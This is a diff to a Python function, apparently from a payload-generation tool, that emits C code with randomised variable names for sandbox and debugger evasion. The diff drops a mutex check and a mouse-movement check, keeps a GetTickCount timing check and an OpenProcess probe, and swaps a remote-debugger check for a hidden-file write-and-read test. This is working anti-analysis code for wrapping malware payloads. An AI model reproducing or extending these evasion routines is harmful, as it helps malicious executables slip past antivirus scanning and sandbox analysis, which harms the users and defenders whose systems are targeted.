@@ -41,22 +41,6 @@ def windows_evasion(number):
         Evasion_code += Randprochandle + " = OpenProcess( PROCESS_ALL_ACCESS, FALSE,4);\n"
         Evasion_code += "if(" + Randprochandle + " == NULL){\n"
 
-    elif number == "0":
-        Randmutex = varname_creator()
-        Evasion_code += "HANDLE " + Randmutex + ";\n"
-        Evasion_code += Randmutex + " = CreateMutex(NULL, TRUE,\"" + Randmutex + "\");\n"
-        Evasion_code += "if(GetLastError() == ERROR_ALREADY_EXISTS){\n"
-
-    elif number == "0":
-        Randpos1 = varname_creator()
-        Randpos2 = varname_creator()
-        Randsleep = str(random.randint(3000,5000))
-        Evasion_code += "POINT " + Randpos1 + "," + Randpos2 + ";\n"
-        Evasion_code += "GetCursorPos(&" + Randpos1 + ");\n"
-        Evasion_code += "Sleep(" + Randsleep + ")\n"
-        Evasion_code += "GetCursorPos(&" + Randpos2 + ");\n"
-        Evasion_code += "if((" + Randpos1 + ".x != " + Randpos2 + ".x) && (" + Randpos1 + ".y != " + Randpos2 + ".y)){"
-
     elif number == "2":
         Randtime1 = varname_creator()
         Randsleep = random.randint(250,1000)
@@ -68,10 +52,20 @@ def windows_evasion(number):
         Evasion_code += "if ((GetTickCount() - " + Randtime1 + ") > " + Randsleepcheck + "){\n"
 
     elif number == "3":
-        Randbool = varname_creator()
-        Evasion_code += "BOOL " + Randbool + " = FALSE;\n"
-        Evasion_code += "CheckRemoteDebuggerPresent(GetCurrentProcess(), &" + Randbool + ");\n"
-        Evasion_code += "if(" + Randbool + " != TRUE){\n"
+        Randvarname = varname_creator()
+        junk = varname_creator()
+        Randfileptr = varname_creator()
+        Randfilename = varname_creator()
+        Randattr = varname_creator()        
+        Evasion_code += "char " + Randvarname + "[] = " + "\"" + junk + "\";\n" 
+        Evasion_code += "FILE *" + Randfileptr + " = fopen(\"" + Randfilename + "\",\"w\");\n"
+        Evasion_code += "fputs(" + Randvarname + "," + Randfileptr + ");\n"
+        Evasion_code += "fclose(" + Randfileptr + ");\n"
+        Evasion_code += "DWORD " + Randattr + " = GetFileAttributes(\"" + Randfilename + "\");\n"
+        Evasion_code += "SetFileAttributes(\"" + Randfilename + "\"," + Randattr + " + FILE_ATTRIBUTE_HIDDEN);\n"
+        Evasion_code += "if ((" + Randfileptr + " = fopen(\"" + Randfilename + "\", \"r\"))){\n"
+        Evasion_code += "fclose(" + Randfileptr + ");\n"
+        Evasion_code += "remove(\"" + Randfilename + "\");\n"
 
     elif number == "4":
 
